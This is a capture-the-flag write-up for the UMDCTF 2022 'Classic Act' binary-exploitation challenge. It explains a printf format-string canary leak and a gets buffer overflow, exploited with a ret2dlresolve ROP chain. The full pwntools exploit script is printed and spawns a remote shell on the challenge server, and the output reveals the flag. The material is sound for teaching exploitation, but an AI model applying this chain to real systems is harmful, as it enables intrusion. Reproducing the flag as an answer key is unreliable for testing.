# UMDCTF 2022

## Classic Act 

> Pwning your friends is a class act. So why not do it to some random server?
> 
> **Author**: WittsEnd2
>
> `0.cloud.chals.io 10058`
>
> [`classicact`](classicact)

Tags: _pwn_ _x86-64_ _bof_ _ret2dlresolve_ _format-string_ _remote-shell_


## Summary

`printf` without a format-string + `gets`, basically makes this a choose your own adventure.

I solved this with _ret2dlresolve_.  Read [this](https://github.com/datajerk/ctf-write-ups/blob/master/redpwnctf2021/getsome_beginner-generic-pwn-number-0_ret2generic-flag-reader_ret2the-unknown/README.md) and follow the links there if you want to learn more about _ret2dlresolve_.

The short of it is, use `printf` to leak the canary, then `gets` to overflow the buffer for a ROP chain that uses _ret2dlresolve_.

60 second solve.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`gets` + Partial RELRO + No PIE = _ret2dlresolve_.  We'll just have to take care of that canary first.

### Ghidra Decompile

```c
bool vuln(void)
{
  int iVar1;
  long in_FS_OFFSET;
  char local_68 [16];
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Please enter your name!");
  gets(local_68);
  puts("Hello:");
  printf(local_68);
  putchar(10);
  puts("What would you like to do today?");
  gets(local_58);
  iVar1 = strncmp(local_58,"Play in UMDCTF!",0xf);
  if (iVar1 != 0) {
    puts("Good luck doing that!");
  }
  else {
    puts("You have come to the right place!");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return iVar1 != 0;
}
```

The main vulnerability is `gets`, but there is a canary spoiling our fun; no worries, `printf` has no format string, so we can use it to leak the canary from the stack:

```
0x00007fffffffe2e0│+0x0000: 0x0000000000000000	 ← $rsp
0x00007fffffffe2e8│+0x0008: 0x00007fff00000000
0x00007fffffffe2f0│+0x0010: 0x0000000068616c62 ("blah"?)	 ← $rdi
0x00007fffffffe2f8│+0x0018: 0x0000000000000000
0x00007fffffffe300│+0x0020: 0x00007ffff7fad4a0  →  0x0000000000000000
0x00007fffffffe308│+0x0028: 0x00007ffff7e516bd  →  <_IO_file_setbuf+13> test rax, rax
0x00007fffffffe310│+0x0030: 0x00007ffff7fac6a0  →  0x00000000fbad2887
0x00007fffffffe318│+0x0038: 0x00007ffff7e47dbc  →  <setbuffer+204> test DWORD PTR [rbx], 0x8000
0x00007fffffffe320│+0x0040: 0x00000000000000c2
0x00007fffffffe328│+0x0048: 0x0000000000401340  →  <__libc_csu_init+0> endbr64
0x00007fffffffe330│+0x0050: 0x00007fffffffe350  →  0x00007fffffffe370  →  0x0000000000000000
0x00007fffffffe338│+0x0058: 0x0000000000401110  →  <_start+0> endbr64
0x00007fffffffe340│+0x0060: 0x00007fffffffe460  →  0x0000000000000001
0x00007fffffffe348│+0x0068: 0xd9d9ed67a31c1800
0x00007fffffffe350│+0x0070: 0x00007fffffffe370  →  0x0000000000000000	 ← $rbp
```

This is the stack just before `printf` is called.  The canary is just above the preserved base pointer (`$rbp`).  You can verify this with `canary`:

```
gef➤  canary
[+] Found AT_RANDOM at 0x7fffffffe6c9, reading 8 bytes
[+] The canary of process 28661 is 0xd9d9ed67a31c1800
```

To compute the parameter to pass to `printf`:

```
gef➤  p/d 0x68 / 8 + 6
$1 = 19
```

The canary is `0x68` bytes from `rsp` (see stack dump above).  Since this is a 64-bit system, just divide by 8 and add 6 (since the previous 5 parameters are in registers, Google for _Linux x86\_64 ABI_ or read the `printf` disassembly or some of my other _format-string_ write ups for details on why _6_).

The rest is cooker cutter ret2dlresolve.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./classicact',checksec=False)

dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])

rop = ROP(binary)
ret = rop.find_gadget(['ret'])[0]
rop.raw(ret)
rop.gets(dl.data_addr)
rop.ret2dlresolve(dl)

if args.REMOTE:
    p = remote('0.cloud.chals.io', 10058)
else:
    p = process(binary.path)

p.sendlineafter(b'name!\n',b'%19$p')
p.recvline()
canary = int(p.recvline().strip().decode(),16)
log.info('canary: {x}'.format(x = hex(canary)))

payload  = b''
payload += (0x58 - 0x10) * b'A'
payload += p64(canary)
payload += (0x58 - len(payload)) * b'B'
payload += rop.chain()
payload += b'\n'
payload += dl.payload

p.sendlineafter(b'today?\n',payload)
p.interactive()
```

Not a lot to explain here.  Just create the _ret2dlresolve_ payload, connect and leak the canary, then write out garbage with the canary inserted into the correct place followed by _ret2dlresolve_ payload, and win!

> If you do not understand `(0x58 - 0x10)` et al, read the decompile carefully or some of my other write ups.  Or look at the stack.  (it's just distance from `local_58` (`gets` buffer) to `local_10` (the canary)).

Output:

```bash
# ./exploit.py REMOTE=1
[*] Loaded 14 cached gadgets for './classicact'
[+] Opening connection to 0.cloud.chals.io on port 10058: Done
[*] canary: 0x5fc49ac400614c00
[*] Switching to interactive mode
Good luck doing that!
$ cat flag
UMDCTF{H3r3_W3_G0_AgAIn_an0thEr_RET2LIBC}
```

Or, is it?